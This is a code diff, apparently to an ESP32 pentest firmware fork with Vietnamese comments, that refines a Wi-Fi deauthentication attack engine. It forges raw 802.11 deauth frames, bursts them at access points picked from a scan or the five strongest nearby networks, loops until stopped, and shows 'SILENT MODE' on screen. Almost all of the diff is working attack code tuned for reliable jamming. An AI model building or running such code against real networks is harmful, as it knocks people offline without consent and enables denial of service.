@@ -275,8 +275,7 @@ bool wifi_atk_unsetWifi() {
 
 // --- NAGAMI INJECT ENGINE FOR C5 ---
 static uint16_t nagami_seq = 0;
-
-void nagami_inject_packet(const uint8_t *bssid, const uint8_t *target, uint8_t channel) {
+void nagami_inject_packet(const uint8_t *bssid, const uint8_t *target) {
     typedef struct {
         uint8_t frame_ctrl[2];
         uint8_t duration[2];
@@ -289,57 +288,53 @@ void nagami_inject_packet(const uint8_t *bssid, const uint8_t *target, uint8_t c
 
     nagami_frame_t frame;
     memset(&frame, 0, sizeof(frame));
-
-    frame.frame_ctrl[0] = 0xC0; // Deauth frame
+    frame.frame_ctrl[0] = 0xC0;
     frame.duration[0] = 0x3A; frame.duration[1] = 0x01;
-    
     memcpy(frame.da, target, 6);
     memcpy(frame.sa, bssid, 6);
     memcpy(frame.bssid, bssid, 6);
 
-    // Quản lý Sequence Number (Lý do bản Bruce hay treo C5 vì thiếu cái này)
     nagami_seq = (nagami_seq + 1) % 4096;
     uint16_t seq_val = (nagami_seq << 4);
     frame.seq[0] = seq_val & 0xFF;
     frame.seq[1] = (seq_val >> 8) & 0xFF;
-    frame.reason[0] = 0x07; // Reason 7
+    frame.reason[0] = 0x07;
 
-    // Gửi qua Interface STA (C5 ổn định nhất ở cổng này)
     esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
 }
 
 // Logic điều khiển Multi-Deauth "Không bao giờ treo"
 void nagami_ultimate_multi_atk(const std::vector<wifi_ap_record_t>& targets) {
     if (targets.empty()) return;
+    cleanlyStopWebUiForWiFiFeature();
     resetGlobalState();
 
-    // CHIÊU THỨC: Reset Stack để Radio sạch hoàn toàn (Học từ bản C thành công)
     esp_wifi_stop();
-    vTaskDelay(pdMS_TO_TICKS(100));
+    vTaskDelay(pdMS_TO_TICKS(200));
     esp_wifi_set_mode(WIFI_MODE_STA);
     esp_wifi_start();
 
-    drawMainBorderWithTitle("Nagami C5 Engine");
-    
+    drawMainBorderWithTitle("Nagami Engine Running");
+    tft.setCursor(10, 50);
+    tft.println("Attacking " + String(targets.size()) + " APs...");
+    tft.println("Status: SILENT MODE");
+    tft.println("\nHold BACK to stop");
+
     while (true) {
         for (const auto &target : targets) {
-            // Nhảy kênh và đợi Radio C5 ổn định tần số (PLL Lock)
             esp_wifi_set_channel(target.primary, WIFI_SECOND_CHAN_NONE);
-            vTaskDelay(pdMS_TO_TICKS(40)); 
+            vTaskDelay(pdMS_TO_TICKS(60));
 
-            // Bắn burst 10 gói nhưng có nghỉ cực ngắn giữa các gói
-            for (int i = 0; i < 10; i++) {
-                nagami_inject_packet(target.bssid, _default_target, target.primary);
-                vTaskDelay(pdMS_TO_TICKS(2)); // Tránh tràn buffer radio
+            for (int i = 0; i < 15; i++) {
+                nagami_inject_packet(target.bssid, _default_target);
+                ets_delay_us(500);
             }
-
             if (check(EscPress)) break;
-            vTaskDelay(1); // Nhường CPU cho hệ thống
+            vTaskDelay(pdMS_TO_TICKS(10));
         }
         if (check(EscPress)) break;
-        vTaskDelay(pdMS_TO_TICKS(50)); // Nghỉ một nhịp giữa các vòng quét
+        vTaskDelay(pdMS_TO_TICKS(100));
     }
-    
     wifi_atk_unsetWifi();
     returnToMenu = true;
 }
@@ -354,10 +349,10 @@ std::vector<String> menu_strings;
 void execute_multi_deauth(const std::vector<wifi_ap_record_t>& targets) {
     if (targets.empty()) return;
     resetGlobalState();
-    
+
     // wifi_atk_setWifi() của Bruce đã gọi esp_wifi_stop() và start() rồi
     // nên chúng ta không cần gọi Reset Stack thủ công ở đây nữa.
-    if (!wifi_atk_setWifi()) return; 
+    if (!wifi_atk_setWifi()) return;
 
     drawMainBorderWithTitle("Multi-Deauth");
     while (true) {
@@ -366,8 +361,8 @@ void execute_multi_deauth(const std::vector<wifi_ap_record_t>& targets) {
             esp_wifi_set_channel(target.primary, WIFI_SECOND_CHAN_NONE);
             vTaskDelay(pdMS_TO_TICKS(50)); // Thêm 50ms nghỉ cho Radio ổn định
 
-            wsl_bypasser_send_raw_frame(&target, target.primary, _default_target); 
-            
+            wsl_bypasser_send_raw_frame(&target, target.primary, _default_target);
+
             for (int i = 0; i < 40; i++) {
                 send_raw_frame(deauth_frame, 26);
                 if (check(EscPress)) break;
@@ -398,19 +393,18 @@ void deauthTop5Attack() {
     std::sort(temp_list.begin(), temp_list.end(), [](const wifi_ap_record_t& a, const wifi_ap_record_t& b) {
         return a.rssi > b.rssi;
     });
-    
+
     std::vector<wifi_ap_record_t> top5;
     for (int i = 0; i < std::min((int)temp_list.size(), 5); i++) top5.push_back(temp_list[i]);
-    execute_multi_deauth(top5);
+    nagami_ultimate_multi_atk(top5);
 }
 
 // --- TÍNH NĂNG 2: MULTI-SELECT (Đã sửa lỗi RAM & Effect [X]) ---
-// --- TÍNH NĂNG 2: MENU MULTI-SELECT (BẢN CHUẨN - CHỐNG TRÀN RAM) ---
 void multi_select_menu() {
     displayTextLine("Scanning..");
     int nets = WiFi.scanNetworks(false, showHiddenNetworks);
-    
-    // BƯỚC 1: Quét và nạp dữ liệu vào ap_records MỘT LẦN DUY NHẤT (Để ngoài while)
+
+    // BƯỚC 1: Quét và nạp dữ liệu một lần duy nhất
     ap_records.clear();
     multi_select_flags.assign(nets, false);
     for (int i = 0; i < nets; i++) {
@@ -418,7 +412,6 @@ void multi_select_menu() {
         memset(&r, 0, sizeof(r));
         memcpy(r.bssid, WiFi.BSSID(i), 6);
         r.primary = WiFi.channel(i);
-        // Lưu tên SSID để dùng khi tấn công
         strncpy((char *)r.ssid, WiFi.SSID(i).c_str(), sizeof(r.ssid) - 1);
         ap_records.push_back(r);
     }
@@ -426,37 +419,40 @@ void multi_select_menu() {
     // BƯỚC 2: Vòng lặp vẽ giao diện (Redraw loop)
     while(true) {
         options.clear();
-        menu_strings.clear(); 
-        
-        // Nút Kích hoạt
-        options.push_back({">> START NAGAMI ENGINE <<", [&]() { // Đổi tên nút cho oai
+        menu_strings.clear();
+
+        // 1. Nút kích hoạt Engine Nagami
+        options.push_back({">> START NAGAMI ENGINE <<", [&]() {
             std::vector<wifi_ap_record_t> selected;
-            for(int i = 0; i < ap_records.size(); i++) {
+            for(int i = 0; i < (int)ap_records.size(); i++) {
                 if(multi_select_flags[i]) selected.push_back(ap_records[i]);
             }
-            // GỌI ENGINE MỚI Ở ĐÂY
-            if(!selected.empty()) nagami_ultimate_multi_atk(selected); 
+            if(!selected.empty()) nagami_ultimate_multi_atk(selected);
         }});
 
-        // Vẽ danh sách WiFi với dấu [X]
+        // 2. Vòng lặp tạo danh sách WiFi với dấu [X] hoặc [ ]
         for (int i = 0; i < nets; i++) {
             String status = multi_select_flags[i] ? "[X] " : "[ ] ";
             String ssid_name = WiFi.SSID(i);
             if(ssid_name.length() == 0) ssid_name = "<Hidden>";
-            
-            menu_strings.push_back(status + ssid_name); 
-            
+
+            menu_strings.push_back(status + ssid_name);
+
             options.push_back({menu_strings.back().c_str(), [&, i]() {
                 multi_select_flags[i] = !multi_select_flags[i];
-                SelPress = false; // HIỆU ỨNG: Ép vẽ lại để hiện dấu [X] ngay
+                SelPress = false; // Reset để menu vẽ lại tại chỗ với trạng thái mới
             }});
         }
 
+        // 3. Hiển thị menu lên màn hình
         addOptionToMainMenu();
         loopOptions(options);
+
+        // Thoát menu khi bấm phím Back
         if (check(EscPress)) break;
     }
 }
+
 
 
 void wifi_atk_menu() {
